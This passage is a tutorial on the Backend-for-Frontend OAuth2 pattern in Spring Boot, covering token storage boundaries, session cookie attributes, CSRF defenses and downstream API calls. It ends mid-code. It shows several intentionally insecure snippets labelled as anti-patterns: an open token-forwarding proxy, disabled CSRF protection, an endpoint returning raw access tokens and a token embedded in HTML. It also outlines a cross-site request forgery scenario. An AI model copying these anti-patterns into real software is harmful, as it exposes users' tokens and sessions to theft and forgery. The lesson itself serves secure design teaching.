# 23.11. BFF Pattern and Token Storage Boundaries Between Backend and Browser

## 1. Why Do We Need a Clear Boundary Between Browser and OAuth2 Tokens?

In a modern web application, the frontend is often built with React, Vue, or Angular, while the backend uses Spring Boot. Users log in via an OpenID Provider (OP), and then the UI calls APIs to read profiles, orders, or business data.

The architectural question is not just **"how to log in with OAuth2?"**—it is also:

- **Who is the OAuth2 client?** JavaScript running in the browser, or the Spring Boot backend?
- **Where is the access token stored?** Browser memory, `localStorage`, `sessionStorage`, cookies, or backend?
- **Does the refresh token ever pass through the browser?**
- **How does the browser prove its login session to the backend?**
- **Which token does the backend use when calling Resource Servers on the user's behalf?**
- **Cookies keep JavaScript from reading tokens, yet how is CSRF prevented?**
- **When running multiple Spring Boot instances, how are sessions and tokens recovered?**
- **On logout, how are refresh tokens, sessions, and OIDC sessions revoked?**

**Backend for Frontend (BFF)** is an architecture where the **backend acts as the confidential OAuth2 client**, executes the Authorization Code Flow, keeps OAuth2 tokens server-side, and provides a **cookie-based session** to the browser. The browser calls **the BFF's APIs** rather than receiving OAuth2 access tokens and calling every downstream API directly.

Example:

```text
Browser JavaScript
    |
    | Cookie: SESSION=opaque-session-id
    | GET /api/orders
    v
BFF - Spring Boot / Spring Security
    |
    | Load session + Authentication
    | Load user's OAuth2AuthorizedClient
    | Refresh token if needed and permitted
    |
    | Authorization: Bearer DOWNSTREAM_ACCESS_TOKEN
    v
Orders Resource Server
```

**Core principle:**

> The browser holds **the BFF session identifier cookie**; the backend holds **access tokens and refresh tokens**. The session cookie must never become an access token, and OAuth2 tokens must never enter JavaScript, HTML, or browser storage.

A BFF cannot prevent every attack. Malicious JavaScript running in the user's trusted origin can still send requests using their active session. A BFF **reduces direct theft of OAuth2 tokens from JavaScript**, yet does not eliminate the need for XSS protection, CSRF protection, session hijacking defenses, and authorization checks.

### Lesson Objectives

After this lesson, you will be able to:

1. Diagram the BFF flow for OAuth2/OIDC Login and API calls.
2. Distinguish session ID cookies, `Authentication`, ID Tokens, access tokens, and refresh tokens.
3. Understand `OAuth2AuthorizedClientRepository`, `OAuth2AuthorizedClientService`, `HttpSession`, and Spring Session.
4. Configure Spring Security Servlet OAuth2 Login with server-side sessions.
5. Set `HttpOnly`, `Secure`, `SameSite`, `Path`, and host-scoping cookie attributes.
6. Protect state-changing requests with CSRF tokens.
7. Understand how `state`, PKCE, and OIDC `nonce` differ from API CSRF tokens.
8. Write frontend `fetch()` calls to the BFF without knowing any OAuth2 tokens.
9. Use the backend to load authorized clients and call downstream Resource Servers.
10. Analyze XSS, CORS, CSRF, token leakage, SSRF, and confused deputy risks.
11. Design a multi-instance BFF with session persistence and refresh-token rotation.
12. Implement logout/revocation and proper error handling across layers.
13. Test the browser–BFF–API security boundary.

All domains, registration IDs, tokens, and sessions in this lesson are **fictional examples**. Examples focus on **Spring Security OAuth 2.0/OIDC Client on Servlet/Spring MVC**; WebFlux differences are covered in a dedicated section.

---

## 2. What a BFF Is—and What It Is Not

A **Backend for Frontend** is a backend tailored to a specific frontend or frontend group. In browser OAuth2 contexts, the BFF handles:

- Initiating Authorization Code Flow and validating callbacks.
- Authenticating the OAuth2 client with the Authorization Server when required.
- Maintaining server-side login/session state.
- Storing OAuth2 tokens on the backend, never handing raw tokens to the browser.
- Calling Resource Servers on the browser's behalf.
- Enforcing authorization and constraining which APIs the frontend may invoke.
- Managing refresh tokens, logout, session expiry, and token revocation per policy.

The BFF can simultaneously perform data aggregation, DTO mapping, and request validation.

### 2.1. A BFF Is Not Just Writing a Reverse Proxy

A dangerous proxy:

```text
GET /proxy?url=https://any-host.example
Authorization: session cookie

BFF:
    Loads user's token
    Attaches Bearer token to whatever URL the browser requested
```

This is not a BFF with safe boundaries. It invites **SSRF**, token exfiltration, and sending tokens to wrong audiences.

A true BFF exposes controlled API endpoints:

```text
GET /api/orders
POST /api/orders/{id}/cancel
GET /api/profile
```

Each endpoint selects a fixed upstream, enforces authorization, and sends access tokens only to permitted Resource Servers.

### 2.2. A BFF Does Not Mean the Backend May Do Anything on the User's Behalf

The backend may hold an access token issued for the user, yet:

- The token remains bounded by scopes, audience, and expiration.
- Resource Servers must still enforce business authorization.
- The BFF must never silently fall back to stronger client credentials to bypass user permissions.
- In multi-tenant apps, the backend must select the right token/tenant for the current request.
- Never let callers supply an arbitrary `principalName` to fetch another user's token.

---

## 3. Comparing Direct SPA vs. BFF

### 3.1. Browser-as-OAuth2-Public-Client Model

```mermaid
flowchart TD
    A["Browser / SPA"] -->|Authorization Code + PKCE| AS["Authorization Server"]
    AS -->|Access Token, optional Refresh Token| A
    A -->|Bearer Access Token| API["Resource Server"]
```

Here, the SPA executes OAuth2 Authorization Code with PKCE as a **public client**. The SPA cannot keep a `client_secret` confidential because any JavaScript shipped to the browser can be inspected by users or malicious same-origin scripts.

Access tokens may stay in memory; some apps pick other browser storage. Every choice carries trade-offs around XSS, page reloads, expiration, session management, and refresh token rotation.

**Never treat `localStorage` or `sessionStorage` as XSS-safe storage for OAuth2 tokens.** Same-origin JavaScript can freely read them.

### 3.2. Backend-as-OAuth2-Confidential-Client Model

```mermaid
flowchart TD
    Browser["Browser / Frontend"] -->|"Session cookie; no OAuth2 tokens"| BFF["BFF - OAuth2 Confidential Client"]
    BFF -->|"Authorization Code + PKCE, client authentication"| AS["Authorization Server"]
    AS -->|"Tokens over back channel"| BFF
    BFF -->|"Bearer access token"| API["Resource Server"]
```

With a BFF:

- The browser still participates in **front-channel redirects**, yet **token exchange** happens over a back channel between the BFF and AS.
- The client secret or private key stays on the backend.
- Tokens reside in backend-controlled storage.
- The browser needs only a session cookie (typically an opaque identifier).
- The BFF executes API calls and returns filtered business data.

### 3.3. Comparison Table

| Aspect | SPA as OAuth2 Client | BFF as OAuth2 Client |
|---|---|---|
| Typical client type | Public | Confidential |
| Who calls the Token Endpoint? | Browser/client runtime, per flow | Backend |
| Can client secret stay confidential? | No | Yes, on the backend with secret management |
| Do access tokens reach JavaScript? | Usually yes | **No**, by BFF principle |
| Do refresh tokens reach JavaScript? | Possibly, if AS/policy permits | **No**, by BFF principle |
| How does browser call APIs? | Direct Bearer token | Cookie to BFF; BFF attaches Bearer to API |
| Risk of XSS stealing raw tokens | Higher if JS-accessible | Greatly reduced |
| Risk of XSS calling APIs via active session | Yes | **Still present** |
| CSRF risk from auto-sent credentials | Depends on token transport | Must be handled because browsers auto-send cookies |
| Backend session store dependency | Not necessarily | Usually yes |
| Backend scaling | Less proxy traffic | Must handle user-session/API gateway traffic |
| Can APIs block direct browser access? | May need CORS | Can restrict APIs to BFF only |
| Logout/refresh | Frontend must coordinate | Backend manages token lifecycle |

Neither choice automatically wins in every scenario. For browser apps needing OAuth2 tokens while minimizing JS token exposure, **BFF is often a strong security choice**.

---

## 4. Distinguishing Commonly Confused Artifacts

| Artifact | Usually Held By (in BFF) | Purpose |
|---|---|---|
| **Session cookie** | Browser | Sends an opaque session identifier to the BFF |
| **Server-side session** | Backend/session store | Session data and `SecurityContext` per configuration |
| **`Authentication` / `SecurityContext`** | Spring Security backend | Identifies logged-in principal and authorities |
| **OIDC ID Token** | Backend | Verifies OIDC authentication event; not an API access token |
| **OAuth2 access token** | Backend authorized client store | Calls Resource Servers matching audience/scope |
| **OAuth2 refresh token** | Backend authorized client store, if issued by AS | Requests new access tokens per policy |

The table lists six items because **the session cookie and the server session record** are also two separate artifacts. A cookie like:

```http
Cookie: JSESSIONID=7C8A9F...
```

is normally just a **reference key** to the server-side session, not a raw access token.

With Spring Session, the cookie may be named `SESSION` instead of `JSESSIONID` depending on configuration. The cookie name does not determine the security model; **cookie contents and backend session management** do.

### 4.1. Session Cookies Are Credentials Too

Even though the cookie holds no OAuth2 tokens, the **session ID is still a bearer credential to the BFF**: anyone stealing a valid cookie can use the session.

Protect cookies with TLS, `HttpOnly`, `Secure`, `SameSite`, TTLs, session fixation protection, logout invalidation, and operational controls.

**Never say "the browser has no tokens so the browser holds no credentials".** The browser holds the session credential.

### 4.2. ID Tokens Do Not Replace Access Tokens

An OIDC ID Token carries claims such as `iss`, `sub`, `aud`, and `exp` so the client knows the End-User authenticated. Resource Server APIs should receive **OAuth2 access tokens** issued specifically for them.

Never blindly send:

```http
Authorization: Bearer <ID_TOKEN>
```

to downstream APIs merely because the ID Token is a JWT.

---

## 5. BFF Login Flow with OIDC Authorization Code Flow

Suppose the app setup is:

```text
Frontend + BFF origin: https://portal.example.com
Authorization Server:  https://login.example-idp.com
Orders API:            https://orders.internal.example
```

### 5.1. Detailed Flow

```mermaid
sequenceDiagram
    autonumber
    actor U as Browser
    participant B as Spring Boot BFF
    participant S as Server Session / Authorized Client Store
    participant AS as OpenID Provider

    U->>B: GET /app or GET /api/me
    B-->>U: Redirect to login or show login
    U->>B: GET /oauth2/authorization/corporate
    B->>S: Save authorization request, state, and PKCE verifier
    B-->>U: 302 to AS /authorize
    U->>AS: GET /authorize with state, code_challenge, nonce if OIDC
    AS->>U: User authentication and consent/policy
    AS-->>U: Redirect back to BFF with code and state
    U->>B: GET /login/oauth2/code/corporate?code=...&state=...
    B->>S: Load authorization request and verify state
    B->>AS: POST /token, authorization_code + PKCE + client authentication
    AS-->>B: Access Token + ID Token; Refresh Token if issued
    B->>B: Verify OIDC ID Token and create Authentication
    B->>S: Save SecurityContext/authorized client on backend
    B-->>U: Set-Cookie HttpOnly session; redirect to /app
    U->>B: GET /api/me, session Cookie
    B->>S: Restore user's SecurityContext
    B-->>U: JSON with allowed user display info, no tokens
```

### 5.2. Front Channel and Back Channel

**Front channel via browser:**

- Navigates to `/authorize`.
- Authorization Code and `state` return to the BFF's redirect URI.
- The BFF session cookie travels between browser and BFF.

**Back channel between backend and AS:**

- Sends authorization code to Token Endpoint.
- Performs client authentication and PKCE verification.
- Receives access token, ID Token, and optional refresh token.
- Persists tokens on the backend.

Seeing an **authorization code** in the redirect does not mean an OAuth2 access token was given to JavaScript. The code is short-lived, single-use, and protected by `state`/PKCE—though logs, referrers, and redirect URIs still require protection.

### 5.3. Confidential BFF Clients Should Still Use PKCE

PKCE is mandatory/essential for public clients, yet also valuable for confidential clients as defense in depth against authorization code interception/injection.

In Spring Security, PKCE can be added to authorization requests via:

```java
OAuth2AuthorizationRequestCustomizers.withPkce()
```

when configuring `DefaultOAuth2AuthorizationRequestResolver`, if needed for confidential clients in your version/setup.

**PKCE does not replace client authentication** or `state`. OIDC `nonce` binds the ID Token to the authentication request. These three mechanisms mitigate distinct threat classes.

---

## 6. Post-Login API Call Flow

```mermaid
sequenceDiagram
    autonumber
    actor Browser
    participant BFF as Spring Boot BFF
    participant Sess as Session Store
    participant AC as Authorized Client Store
    participant AS as Authorization Server
    participant API as Orders Resource Server

    Browser->>BFF: GET /api/orders + Cookie SESSION
    BFF->>Sess: Load SecurityContext by session ID
    Sess-->>BFF: Authentication(Alice)
    BFF->>BFF: Check endpoint authorization
    BFF->>AC: Load Alice's authorized client
    AC-->>BFF: Access Token AT1 + expiry
    opt Token needs renewal
        BFF->>AS: POST /token with refresh token RT1 if present
        AS-->>BFF: AT2 + RT2 if AS rotates
        BFF->>AC: Save updated authorized client
    end
    BFF->>API: GET /orders, Authorization Bearer access token
    API->>API: Validate issuer/audience/scope/ownership
    API-->>BFF: Orders JSON
    BFF-->>Browser: Business JSON, no access/refresh tokens
```

Key facts:

- The browser **never sends an Authorization Bearer access token to the BFF** in a session-cookie BFF model.
- The backend **never sends the BFF session cookie to the Resource Server**.
- The BFF **never returns access tokens or refresh tokens in JSON**.
- The Resource Server still validates access tokens itself; BFF login does not replace API authorization.
- Refresh tokens are managed server-side and might not be issued by the AS.

### 6.1. "Every API Call Must Request a New Token" Is Wrong

`OAuth2AuthorizedClientManager` and the authorized client store **reuse valid unexpired access tokens** and refresh only when needed per provider configuration. Never call the Token Endpoint before every outgoing API call when the access token is still valid.

---

## 7. Spring Security Components Storing Sessions and Tokens

The Servlet stack includes multiple abstractions; distinguish them carefully.

### 7.1. `SecurityContextRepository`

Example:

```java
org.springframework.security.web.context.SecurityContextRepository
```

Saves and restores `SecurityContext` for inbound requests, typically using `HttpSession` per security chain configuration.

`SecurityContext` holds `Authentication`, not the full OAuth2 token cache by default.

### 7.2. `HttpSession`

`HttpSession` is Servlet's server-side session mechanism. The browser holds a session ID cookie; the server holds session data.

Spring Security can store `SecurityContext` and authorization request state in the session. Across multiple instances, adopt a strategy to share/persist sessions across nodes.

### 7.3. `OAuth2AuthorizedClientRepository`

Interface:

```java
org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository
```

Loads/saves/removes authorized clients in the context of a Servlet request and `Authentication`, taking:

```java
HttpServletRequest
HttpServletResponse
```

### 7.4. `OAuth2AuthorizedClientService`

Interface:

```java
org.springframework.security.oauth2.client.OAuth2AuthorizedClientService
```

Saves/retrieves authorized clients by:

```text
(clientRegistrationId, principalName)
```

A multi-user BFF holds:

```text
("corporate", "alice-uid") -> AT_ALICE, RT_ALICE
("corporate", "bob-uid")   -> AT_BOB, RT_BOB
```

Never keep a single `lastAccessToken` singleton shared across all users.

### 7.5. Implementations to Know

| Implementation | Typical Use |
|---|---|
| `HttpSessionOAuth2AuthorizedClientRepository` | Authorized clients stored in Servlet HTTP session |
| `AuthenticatedPrincipalOAuth2AuthorizedClientRepository` | Delegates to a service for authenticated principals, usually session repo for anonymous |
| `InMemoryOAuth2AuthorizedClientService` | Stored in a single process's RAM |
| `JdbcOAuth2AuthorizedClientService` | Stored in a relational database |
| Spring Session | Persists/restores HTTP sessions via Redis/JDBC or a matching repository |

**Spring Session and `OAuth2AuthorizedClientService` are not the same abstraction.**

If `SecurityContext` is shared via Spring Session Redis while authorized clients use **per-pod `InMemoryOAuth2AuthorizedClientService`**, a request landing on Pod B may have a valid login session yet fail to find the authorized client stored only on Pod A.

Conversely, having a shared authorized client DB with node-local sessions still loses the login session when traffic switches nodes.

---

## 8. Storage Boundaries: What Lives Where?

| Data | Browser | BFF Memory/Session/Store | Authorization Server | Resource Server |
|---|---|---|---|---|
| BFF session ID | **Yes, in cookie** | Session record mapped to ID | No | No |
| `SecurityContext`/`Authentication` | Never sent as raw object | **Yes** | Own identity store | Request auth from API token |
| Authorization Code | May appear briefly in redirect URL | Receives and exchanges for tokens | Issues code | No |
| `state`/PKCE verifier | Browser sees `state` in URL | **Keeps verifier and expected state** | Receives challenge/compares | No |
| OAuth access token | **No in BFF pattern** | **Yes** | Issues | Receives to verify |
| OAuth refresh token | **No** | **Yes, if issued** | Issues/validates | No |
| OIDC ID Token | **No need to return to browser** | **Yes with OIDC Login** | Issues | Never use as API token |
| CSRF token for BFF API | Readable/sent in header by JS | Holds state/validation policy | Unrelated | Unrelated |
| Business API response | **Yes** | May transform/cache | No | **Produces data** |

"No" is an **enforceable design boundary**. If the backend accidentally serializes `OAuth2AuthorizedClient` to JSON or leaks tokens into `<script>`, `Set-Cookie`, URL fragments, or headers, the BFF boundary is broken.

### 8.1. Keep Refresh Tokens Out of the Browser

Refresh tokens can typically mint new access tokens for long periods; once exposed to JavaScript, they can be stolen via XSS or compromised third-party scripts.

A BFF must never put refresh tokens into:

```text
localStorage
sessionStorage
IndexedDB
window.__INITIAL_STATE__
HTML meta tags
JavaScript variables
URL query/fragment
Readable cookies
JSON responses
```

Even placing a refresh token inside a browser-side `HttpOnly` cookie **is not server-side token storage**. Cookies still traverse HTTP requests, risk logging/proxy exposure, face size limits, and carry replay risk. **A BFF should use a cookie holding an opaque session identifier** and store refresh tokens on the backend.

### 8.2. Why Not Encrypt the Access Token and Return It to the Browser?

Encrypting a token before handing it to the browser does not turn it into server-side storage. Making the browser hold ciphertext is a different architecture from a traditional session BFF and introduces cookie-size, replay, rotation, key-management, and CSRF trade-offs.

Do not confuse "the browser cannot decrypt the token" with "there is no token in the browser". This lesson enforces the boundary **browser holds only a session cookie**, storing zero OAuth2 tokens even as encrypted blobs.

---

## 9. Session Cookies: `HttpOnly`, `Secure`, `SameSite`, `Path`, and `Domain`

Example session cookie:

```http
Set-Cookie: __Host-SESSION=RANDOM_OPAQUE_ID; Path=/; Secure; HttpOnly; SameSite=Lax
```

This is an illustrative pattern. To use the `__Host-` prefix, the cookie must set `Secure`, `Path=/`, and **omit `Domain`**; the backend must configure both the cookie name and session repository accordingly.

### 9.1. `HttpOnly`

```http
HttpOnly
```

Prevents ordinary JavaScript from reading the cookie via `document.cookie`, reducing the risk of XSS **stealing the raw cookie value directly**.

However, same-origin XSS can still run:

```js
fetch("/api/orders", { credentials: "same-origin" });
```

The browser attaches the cookie automatically. Thus `HttpOnly` **does not stop XSS from acting within the active session**.

### 9.2. `Secure`

```http
Secure
```

Restricts browsers to sending the cookie over HTTPS (aside from narrow browser-specific dev exceptions).

Production BFFs must run end-to-end HTTPS or sit behind trusted TLS-terminating reverse proxies. If the BFF's public URL is HTTPS while Spring speaks internal HTTP behind a proxy, configure forwarded headers within a proper trust boundary so URLs and cookies are emitted accurately.

### 9.3. `SameSite`

Common values:

| Value | General Behavior | Risks / Notes |
|---|---|---|
| `Strict` | Restricts cookies on cross-site requests | Can break redirect navigation returning from the IdP |
| `Lax` | Allows cookies on certain top-level cross-site navigations, usually GET | Does not replace CSRF tokens; usually fits GET redirect callbacks |
| `None` | Allows cross-site cookie delivery per browser policy | **Must include `Secure`**; increases CSRF exposure and faces third-party cookie blocking |

`SameSite` evaluates **site**, which is not identical to **origin**. Two subdomains can be same-site yet cross-origin.

For OIDC Authorization Code **top-level GET** redirect callbacks, `SameSite=Lax` generally fits. If the IdP uses `response_mode=form_post`, the callback is a cross-site POST so `Lax` may omit the correlation/session cookie. Design compatible cookie/callback handling instead of turning off `state` validation.

### 9.4. `Path` and Host-Only Cookies

Scope the cookie tightly to the BFF app that needs it:

- `Path=/` when the whole portal shares one session.
- Omit `Domain=.example.com` unless explicitly required; host-only cookies avoid exposing sessions to sibling subdomains.
- The `__Host-` prefix enforces host-only scoping in supporting browsers.
- Never put session IDs in URLs, query parameters, fragments, or logs.

### 9.5. Session Cookies Can Still Be Stolen

`HttpOnly` does not stop everything: malware, compromised browsers, misconfigured proxies, plaintext HTTP, or server logs can still leak session IDs.

Protect session IDs like credentials. Logout and session invalidation must render old IDs unusable.

---

## 10. Why Must a Cookie-Based BFF Defend Against CSRF?

Browsers **automatically attach session cookies** whenever a request matches cookie rules. A malicious site can trick the browser into sending authenticated requests to the BFF.

Example:

```text
Alice is logged into portal.example.com

Alice opens evil.example.org
    |
    +-- Malicious page submits POST to portal.example.com/api/orders/123/cancel
    |
    +-- Browser may attach BFF session cookie depending on SameSite/context
    |
    +-- Without BFF CSRF checks -> unauthorized state mutation risk
```

Even though the BFF never gives OAuth2 tokens to the browser, **cookie authentication** still requires CSRF protection.

### 10.1. CSRF Tokens vs. OAuth2 `state`

| Mechanism | Primary Protection |
|---|---|
| `state` | Binds OAuth2 authorization response to the initiating request; mitigates login CSRF/mix-up |
| PKCE | Binds authorization code to client-held verifier; stops code interception/injection |
| OIDC `nonce` | Binds ID Token to OIDC authentication request; prevents token replay per OIDC |
| **CSRF token for BFF APIs** | Protects state-changing HTTP requests using cookie authentication |
| `SameSite` cookie | One layer reducing cross-site cookie sending as enforced by browsers |

`state` does not replace the CSRF token on `/api/orders`. And `SameSite=Lax` is never an excuse to disable the CSRF filter.

### 10.2. Spring Security Default CSRF

In Spring Security Servlet, CSRF protection is enabled by default in standard web configurations. **Keep it enabled** when using session cookies.

State-changing HTTP methods (`POST`, `PUT`, `PATCH`, `DELETE`) require CSRF validation unless narrowly exempted with sound security justification.

Never write:

```java
http.csrf(csrf -> csrf.disable()); // Anti-pattern for session-cookie BFFs
```

merely because the frontend is an SPA and the API returns JSON.

### 10.3. Can JavaScript Read the CSRF Token?

Yes—this is standard in **double-submit** or **synchronizer token** patterns. A CSRF token **is not an OAuth2 access token** or refresh token.

For example, the BFF exposes an endpoint returning the token to the SPA:

```json
{
  "headerName": "X-CSRF-TOKEN",
  "token": "CSRF_VALUE_FOR_CURRENT_SESSION"
}
```

JavaScript attaches this header on state-changing requests. Because cross-site pages cannot normally read same-origin responses under the Same-Origin Policy, attackers cannot easily obtain the CSRF token.

However, **same-origin XSS can read the CSRF token**. Defend against CSRF and XSS independently.

---

## 11. Configuring a Spring Boot Servlet BFF

An illustrative Spring Boot 3.x application uses:

```groovy
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-web'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-oauth2-client'
}
```

When using `RestClient` (Spring Framework 6.1+, Boot 3.2+) to call downstream APIs, `starter-web` already includes the HTTP client API.

In Boot 4.x, starter names are reorganized in some areas; rely on your current Boot/Security BOM rather than copying scattered versions.

### 11.1. `application.yml` for OIDC Login

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          corporate:
            provider: corporate-idp
            client-id: ${CORPORATE_CLIENT_ID}
            client-secret: ${CORPORATE_CLIENT_SECRET}
            client-authentication-method: client_secret_basic
            authorization-grant-type: authorization_code
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
            scope:
              - openid
              - profile
              - orders.read
        provider:
          corporate-idp:
            issuer-uri: https://login.example-idp.com
```

`orders.read` is just an example; providers may require Resource Indicators, audience configs, or separate API permissions. **A successful OIDC Login does not guarantee the issued access token works for the Orders API.**

In a BFF:

- `client-id`/`client-secret` live only in backend config/secret managers.
- Redirect URIs point **to the BFF**, never to a JavaScript SPA callback.
- Enable PKCE per policy and version configuration.
- `openid` activates OIDC Login when supported by the IdP.
- The Authorization Server may omit refresh tokens; never assume one is always issued.

### 11.2. Session Cookie Settings

Example with container-managed Servlet sessions:

```yaml
server:
  servlet:
    session:
      timeout: 30m
      cookie:
        http-only: true
        secure: true
        same-site: lax
        path: /
```

`timeout: 30m` is illustrative. Choose session TTLs based on risk and UX; you may also need **absolute lifetimes**, idle timeouts, reauthentication, and dedicated policies.

When using **Spring Session**, cookie serializers and application properties have their own configuration mechanisms. Never assume `server.servlet.session.cookie.*` governs every Spring Session cookie across every version/deployment.

### 11.3. Never Use `STATELESS` for BFF Session Login

Anti-pattern:

```java
.sessionManagement(session ->
    session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
)
```

This contradicts traditional session-cookie BFFs and prevents retaining authentication/sessions as expected.

Use the default or:

```java
.sessionManagement(session ->
    session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
)
```

so Spring Security creates sessions when required by the login flow.

**BFFs can be built with other session models**, yet once you choose server-side cookie sessions, do not mix them with a stateless Bearer API policy expecting both to work automatically.

---

## 12. BFF `SecurityFilterChain`

Example:

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
public class BffSecurityConfiguration {

    @Bean
    SecurityFilterChain bffSecurityFilterChain(HttpSecurity http)
            throws Exception {

        http
            .authorizeHttpRequests(authorize -> authorize
                .requestMatchers(
                    "/",
                    "/index.html",
                    "/assets/**",
                    "/favicon.ico",
                    "/error"
                ).permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(Customizer.withDefaults())
            .oauth2Client(Customizer.withDefaults())
            .logout(logout -> logout
                .logoutUrl("/logout")
                .invalidateHttpSession(true)
                .clearAuthentication(true)
            );

        // Keep default CSRF protection enabled.
        return http.build();
    }
}
```

Explanation:

1. Frontend static assets load before login.
2. API endpoints require `Authentication`.
3. OAuth2 Login establishes authentication and handles callbacks.
4. OAuth2 Client support manages authorized clients.
5. Logout invalidates the session per config.
6. CSRF stays enabled.
7. Sessions remain permitted.

In real deployments, verify SPA routing (fallback to `index.html`), authorization endpoint `/oauth2/authorization/{registrationId}`, callback `/login/oauth2/code/{registrationId}`, and login entrypoints on the filter chain.

### 12.1. Never Put `/api/**` Under `permitAll()`

If `/api/orders` lacks explicit authentication checks while the filter chain permits all API routes, the BFF processes unauthenticated requests or throws confusing errors.

Clearly separate public and authenticated endpoints. When multiple `SecurityFilterChain` beans exist, ensure matchers and chain ordering are exact.

### 12.2. Session Fixation Protection

Upon login, Spring Security applies session fixation protection by default, preventing attackers from reusing a pre-set session ID after authentication.

Never disable session fixation protection just to "keep the same cookie" while debugging OAuth2 login without a thoroughly reviewed security reason.

### 12.3. Never Expose a Token Endpoint to the Frontend

Never create:

```java
@GetMapping("/api/access-token")
public String token(...) {
    return authorizedClient.getAccessToken().getTokenValue();
}
```

This destroys the BFF boundary. Browsers could use the cookie to pull raw access tokens, and XSS could do the same.

Instead, expose business endpoints returning filtered data:

```text
GET /api/orders -> OrderDto[]
GET /api/me     -> UserProfileDto
```

---

## 13. CSRF Endpoint for Cookie-Session SPAs

A clean, controllable approach exposes the token to JavaScript via JSON and requires the browser to echo it back in a header on state-changing requests.

Controller example:

```java
import java.util.Map;

import jakarta.servlet.http.HttpServletRequest;

import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class CsrfController {

    @GetMapping("/api/csrf")
    public Map<String, String> csrf(HttpServletRequest request) {
        CsrfToken token = (CsrfToken)
            request.getAttribute(CsrfToken.class.getName());

        if (token == null) {
            throw new IllegalStateException(
                "CSRF protection is not configured"
            );
        }

        return Map.of(
            "headerName", token.getHeaderName(),
            "token", token.getToken()
        );
    }
}
```

In the `SecurityFilterChain` above, `/api/csrf` requires authentication via `.anyRequest().authenticated()`. The SPA calls it after logging in. To allow pre-login calls, add a public matcher while preserving CSRF/session semantics.

**Spring Security 6 note:** Deferred CSRF tokens and BREACH-protecting request handlers are used by default. Reading the token from the `CsrfFilter`-populated request attribute is supported, though custom handlers or cookie CSRF repositories require verifying the exact header format expected from JS.

### 13.1. Frontend Calling the CSRF Endpoint

```javascript
async function loadCsrf() {
  const response = await fetch("/api/csrf", {
    credentials: "same-origin"
  });

  if (!response.ok) {
    throw new Error("Unable to load CSRF token");
  }

  return response.json();
}

async function cancelOrder(orderId) {
  const csrf = await loadCsrf();

  const response = await fetch(
    "/api/orders/" + encodeURIComponent(orderId) + "/cancel",
    {
      method: "POST",
      credentials: "same-origin",
      headers: {
        [csrf.headerName]: csrf.token
      }
    }
  );

  if (!response.ok) {
    throw new Error("Unable to cancel order");
  }

  return response.json();
}
```

JavaScript **never** handles OAuth2 access tokens. It relies solely on:

- The browser session cookie attached automatically by the browser.
- The CSRF token supplied by the backend.
- Business JSON inputs and outputs.

### 13.2. CSRF Tokens Do Not Replace Origin Policies

If XSS occurs, malicious scripts in the BFF origin can read the CSRF token and fire API calls. Enforce CSP, output escaping, HTML sanitization where appropriate, and third-party script controls.

CSRF tokens stop **cross-site request forgery**, not malicious same-origin JavaScript.

### 13.3. `CookieCsrfTokenRepository` as an Alternative

Spring Security also provides:

```java
CookieCsrfTokenRepository.withHttpOnlyFalse()
```

often used when an SPA reads a **CSRF token cookie** directly and echoes it in the expected header.

Never confuse this with the `HttpOnly` session cookie or OAuth2 token cookies. The CSRF cookie may need to be JS-readable per frontend architecture, while **the session ID must remain `HttpOnly`** and OAuth2 tokens remain on the backend.

Customizing `CookieCsrfTokenRepository` in Spring Security 6 requires handling deferred tokens, BREACH handlers, and CSRF token rotation across login/logout. The JSON endpoint above illustrates the boundary more simply.

---

## 14. Frontend Calling the BFF Without Receiving Access Tokens

A browser API call after login:

```javascript
async function loadOrders() {
  const response = await fetch("/api/orders", {
    method: "GET",
    credentials: "same-origin",
    headers: {
      "Accept": "application/json"
    }
  });

  if (response.status === 401) {
    window.location.assign("/oauth2/authorization/corporate");
    return;
  }

  if (!response.ok) {
    throw new Error("Cannot load orders");
  }

  return response.json();
}
```

Notice:

- `credentials: "same-origin"` lets the browser attach cookies to the same origin.
- No `localStorage.getItem("access_token")`.
- No manual `Authorization: Bearer ...` header.
- The backend selects the token for the Orders API.
- The API response is business data, never tokens.

**Watch out for redirects inside `fetch()`:** If an endpoint returns a `302` to the IdP on an XHR/`fetch()`, the browser will not navigate the top-level page and will hit CORS/HTML errors. In SPAs, separate **login navigation** from API calls via a `401`/session-expired convention so the frontend navigates explicitly to `/oauth2/authorization/corporate`.

Some apps return `401` on `/api/me` when unauthenticated and trigger OAuth2 Login only on HTML GET navigations. Distinguish expectations between **API calls** and **top-level browser navigations**.

### 14.1. Never Embed Raw Tokens in HTML Bootstrap Data

Anti-pattern:

```html
<script>
  window.ACCESS_TOKEN = "...";
</script>
```

Even though the server rendered the HTML, the token is now JS-accessible and breaks the BFF boundary.

You may embed **minimal display info** like a display name or feature flags after safe escaping/serialization, never tokens or session cookie IDs.

---

## 15. Backend Calling Orders API with `OAuth2AuthorizedClient`

A Spring MVC controller can receive the user's authorized client via:

```java
@RegisteredOAuth2AuthorizedClient("corporate")
OAuth2AuthorizedClient authorizedClient
```

This is a backend object managed by the OAuth2 Client infrastructure. Never return it directly as JSON because it contains access/refresh tokens.

### 15.1. Example Downstream Call with `RestClient`

```java
import java.util.List;

import org.springframework.core.ParameterizedTypeReference;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.annotation.RegisteredOAuth2AuthorizedClient;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestClient;

@RestController
public class OrdersController {

    private final RestClient ordersClient;

    public OrdersController(RestClient.Builder builder) {
        this.ordersClient = builder
            .baseUrl("https://orders.internal.example")
            .build();
    }

    @GetMapping("/api/orders")
    public List<OrderDto> orders(
            @RegisteredOAuth2AuthorizedClient("corporate")
            OAuth2AuthorizedClient authorizedClient) {

        return ordersClient.get()
            .uri("/v1/orders")
            .headers(headers ->
                headers.setBearerAuth(
